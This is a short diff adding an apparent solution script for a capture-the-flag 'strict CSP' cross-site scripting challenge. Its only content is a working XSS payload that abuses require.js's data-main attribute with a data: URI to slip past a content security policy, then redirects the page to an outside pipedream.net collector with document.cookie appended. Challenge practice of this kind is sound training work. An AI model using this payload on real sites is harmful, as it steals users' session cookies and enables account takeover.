@@ -1,0 +1,3 @@
+//this is the script for "strict csp" challengeXSS
+
+<script data-main='data:1,document.location = "https://eo8cgxvqm8oxt7m.m.pipedream.net/?" + document.cookie' src='require.js'></script>
